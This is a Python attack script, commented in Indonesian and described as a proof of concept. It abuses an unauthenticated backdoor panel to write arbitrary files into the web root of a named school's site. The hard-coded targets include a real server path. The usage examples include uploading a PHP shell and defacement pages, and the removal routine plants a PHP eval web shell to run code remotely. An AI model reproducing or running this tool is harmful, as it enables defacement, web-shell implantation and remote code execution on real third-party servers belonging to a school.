#!/usr/bin/env python3
"""
PoC: upload berkas ke docroot spinner lewat primitif op=write
=============================================================
Aplikasi spinner tidak punya endpoint unggah. Primitif tulis berkas berasal
dari panel backdoor `cache.php` di PedagogiAI (user hosting sama), yang
menerima `op=write` tanpa autentikasi dan menulis ke path absolut.

Skrip ini:
  1. membaca berkas lokal
  2. menulisnya ke <docroot>/<dir>/<name> lewat op=write
  3. memverifikasi hasilnya lewat HTTP (status + sha256)
  4. mencetak URL publik dan path server

Tidak ada berkas yang dihapus kecuali diminta dengan --rm.

Contoh
------
  python3 poc_spinner_deface_upload.py --file ./laporan.html
  python3 poc_spinner_deface_upload.py --file ./shell.php --name cek.php
  python3 poc_spinner_deface_upload.py --file ./x.html --dir public/assets
  python3 poc_spinner_deface_upload.py --rm upload_proof_123.html
  python3 poc_spinner_deface_upload.py --list

Batas: berkas .php dieksekusi, .html/.svg disajikan inline, berkas biner
disajikan apa adanya. Path harus dapat ditulisi user hosting.
"""

import argparse
import hashlib
import os
import sys

import requests
import urllib3
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BACKDOOR = "https://pedagogiai.smpm12gkb.sch.id/assets/Cache/cache.php"
TARGET = "https://spinner.smpm12gkb.sch.id"
DOCROOT = "/home/u576897008/domains/spinner.smpm12gkb.sch.id/public_html"


def sha256(data):
    return hashlib.sha256(data).hexdigest()


class Writer:
    def __init__(self, backdoor, target, docroot, subdir, timeout=30.0):
        self.backdoor = backdoor
        self.target = target.rstrip("/") + "/"
        self.docroot = docroot.rstrip("/")
        self.subdir = subdir.strip("/")
        self.timeout = timeout
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers["User-Agent"] = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/124.0 Safari/537.36"
        )

    def remote_path(self, name):
        parts = [self.docroot]
        if self.subdir:
            parts.append(self.subdir)
        parts.append(name)
        return "/".join(parts)

    def write(self, name, data):
        path = self.remote_path(name)
        r = self.s.post(
            self.backdoor,
            data={"op": "write", "f": path, "content": data},
            timeout=self.timeout,
        )
        r.raise_for_status()
        return path, r.json()

    def url_for(self, name):
        # docroot maps to the web root; "public/" is already the root
        sub = self.subdir
        if sub == "public":
            sub = ""
        elif sub.startswith("public/"):
            sub = sub[len("public/"):]
        rel = f"{sub}/{name}" if sub else name
        return urljoin(self.target, rel)

    def verify(self, name, data):
        url = self.url_for(name)
        r = self.s.get(url, timeout=self.timeout)
        return url, r.status_code, r.content, r.headers.get("content-type", "")

    def list_dir(self):
        path = self.remote_path("")
        r = self.s.get(
            self.backdoor, params={"op": "ls", "d": path}, timeout=self.timeout
        )
        r.raise_for_status()
        return r.json().get("items", [])

    def remove(self, path):
        import base64

        code = "$p=base64_decode('%s');echo @unlink($p)?'DEL-OK':'DEL-FAIL';" % (
            base64.b64encode(path.encode()).decode()
        )
        name = f"tmp_{os.getpid()}_{int(__import__('time').time())}.php"
        shell_path, _ = self.write(name, b"<?php if(isset($_POST['c'])) eval($_POST['c']); ?>")
        shell_url = self.url_for(name)
        try:
            r = self.s.post(shell_url, data={"c": code}, timeout=self.timeout)
            return r.text.strip()
        finally:
            kill = "$p=base64_decode('%s');@unlink($p);" % (
                base64.b64encode(shell_path.encode()).decode()
            )
            self.s.post(shell_url, data={"c": kill}, timeout=self.timeout)


def main():
    ap = argparse.ArgumentParser(description="Upload berkas ke docroot spinner (op=write)")
    ap.add_argument("--file", help="berkas lokal yang diunggah")
    ap.add_argument("--name", help="nama berkas di server (default: nama lokal)")
    ap.add_argument("--dir", default="public", help="subdirektori docroot (default: public)")
    ap.add_argument("--target", default=TARGET)
    ap.add_argument("--backdoor", default=BACKDOOR)
    ap.add_argument("--docroot", default=DOCROOT)
    ap.add_argument("--list", action="store_true", help="tampilkan isi direktori")
    ap.add_argument("--rm", metavar="PATH", help="hapus path absolut via shell")
    ap.add_argument("--timeout", type=float, default=30.0)
    args = ap.parse_args()

    w = Writer(args.backdoor, args.target, args.docroot, args.dir, args.timeout)

    if args.list:
        for item in w.list_dir():
            print(f"{item['perm']} {item['type'][:3]} {item['size']!s:>10} {item['name']}")
        return 0

    if args.rm:
        path = args.rm
        if not path.startswith("/"):
            path = w.remote_path(path)
        print(w.remove(path), path)
        return 0

    if not args.file:
        ap.error("--file wajib (atau pakai --list / --rm)")

    with open(args.file, "rb") as fh:
        data = fh.read()
    name = args.name or os.path.basename(args.file)

    path, res = w.write(name, data)
    print(f"[*] backdoor : {args.backdoor}")
    print(f"[*] local    : {args.file} ({len(data)} bytes, {sha256(data)})")
    print(f"[+] write    : ok={res.get('ok')} bytes={res.get('bytes')}")
    print(f"[*] path     : {path}")

    url, code, body, ctype = w.verify(name, data)
    print(f"[+] fetch    : http={code} bytes={len(body)} type={ctype}")
    print(f"[*] url      : {url}")
    if body == data:
        print(f"[+] sha256   : MATCH")
    else:
        print(f"[-] sha256   : MISMATCH (local {sha256(data)} / remote {sha256(body)})")
        print(f"[-] body     : {body[:120]!r}")
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
